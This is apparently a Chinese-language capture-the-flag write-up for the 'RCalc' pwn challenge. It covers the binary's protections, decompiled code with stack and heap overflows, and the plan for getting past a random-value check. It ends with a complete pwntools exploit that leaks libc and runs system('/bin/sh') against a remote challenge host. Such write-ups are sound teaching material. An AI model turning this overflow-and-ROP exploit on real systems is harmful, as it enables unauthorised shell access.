# RCalc

## 来源
World of Attack & Defense


## 难度

3 / 10

## 保护

 ```sh
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
 ```

## 简单描述

是一个计算器程序,先输入名字,后面可以使用4个运算,还能进行储存.

## vul

```c
__int64 sub_400FA2()
{
  __int64 result; // rax
  char v1; // [rsp+0h] [rbp-110h]
  __int64 v2; // [rsp+108h] [rbp-8h]

  v2 = sub_400AAB();
  printf("Input your name pls: ");
  __isoc99_scanf("%s", &v1); //vul 能堆栈溢出
  printf("Hello %s!\nWelcome to RCTF 2017!!!\n", &v1);
  puts("Let's try our smart calculator");
  sub_400E72("Let's try our smart calculator", &v1);
  result = sub_400B92();
  if ( result != v2 )
    quit();
  return result;
}

...
//储存功能
__int64 __fastcall sub_400E39(__int64 a1)
{
  __int64 v1; // rsi
  __int64 v2; // rdx
  __int64 result; // rax

  v1 = *(_QWORD *)(qword_6020F8 + 8);
  v2 = (*(_QWORD *)qword_6020F8)++;
  result = a1;
  *(_QWORD *)(v1 + 8 * v2) = a1; //若一直储存,能构成堆溢出
  return result;
}
```



## 知识点

stack overflow, heap overflow

## 思路

采用的是ret2libc,而要想实现,那么就要得绕过随机数检查,在输入名字的时候,就可以覆盖随机数,但是程序已经把随机数储存在堆里,而在对数进行运算后,可以对数进行储存,若多次储存数可以造成heap overflow,若覆盖到储存随机数的地方,那么我们就可以修改这个值,从而绕过随机数检查,后面就采用ret2libc的打法了,注意的是,scanf()不能读取\x09,\x0a,\x20,这几个字符,所以在利用的payload中不要出现,\x0a可以在后面.而puts的plt地址有\x20,所以不能使用puts来打印got,采用printf,而大部分got表中的地址都有\x20,那使用`__libc_start_main`就可以解决,还有采用printf打印的时候,会出现内存不可读现象,那就将rsi寄存器清空为0就可以解决.



## exp

```python
#!/usr/bin/env python
#-*- coding:utf-8 -*-
# Author: I0gan

from pwn import *
#from LibcSearcher import LibcSearcher

context.log_level='debug'
#context(arch = 'i386', os = 'linux', log_level='debug')
#context(arch = 'amd64', os = 'linux', log_level='debug')

exeFile = 'RCalc'
libFile = '/lib/x86_64-linux-gnu/libc.so.6'

remoteIp = "124.126.19.106"
remotePort = 57257

LOCAL = 0
LIB   = 1

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
s   =  lambda x : io.send(x)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
li    = lambda x : log.info('\x1b[01;38;5;214m' + x + '\x1b[0m')
db    = lambda   : gdb.attach(io)

#--------------------------Func-----------------------------
def ad(num1, num2):
	sla('Your choice:', '1')
	sla('integer:', str(num1) + '\n' + str(num2))
	sla('result?', 'yes')
	
#--------------------------Exploit--------------------------
def exploit():
	pop_rdi = 0x401123
	pop_rsi_r15 = 0x0000000000401121
	start = 0x401036

	p = 'A' * 0x108
	p += p64(0x1) # random num
	p += p64(0xdeedbeef)
	p += p64(pop_rdi)
	leak = '__libc_start_main'
	p += p64(exe.got[leak]) # scanf cannot read \x20

	p += p64(pop_rsi_r15) + p64(0) + p64(0) # for printf cannot read mem
	p += p64(exe.plt['printf'])
	p += p64(start) # cannot read 0x9

	sla('pls:', p)

	for i in range(0x20):
		ad(1, 2)
	ad(2, 2)
	ad(0x331, 0)

	ad(0x1, 0)
	sla('Your choice:', '5')
	
	lib.address = u64(ru('\x7f')[-5:] + '\x7f\x00\x00') - lib.sym[leak]
	li('libc_base ' + hex(lib.address))

	p = 'A' * 0x108
	p += p64(0x1) # random num
	p += p64(0xdeedbeef)
	p += p64(pop_rdi)
	p += p64(lib.search('/bin/sh').next()) # scanf cannot read \x20
	p += p64(lib.sym['system'])
	sla('pls:', p)

	for i in range(0x20):
		ad(1, 2)
	ad(2, 2)
	ad(0x331, 0)

	ad(0x1, 0)
	#db()
	sla('Your choice:', '5')


def finish():
	ia()
	c()

#--------------------------Main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		exe = ELF(exeFile)
		if LIB:
			lib = ELF(libFile)
			io = exe.process(env = {"LD_PRELOAD" : libFile})
		else:
			io = exe.process()
	
	else:
		exe = ELF(exeFile)
		io = remote(remoteIp, remotePort)
		if LIB:
			lib = ELF(libFile)
	
	exploit()
	finish()

```

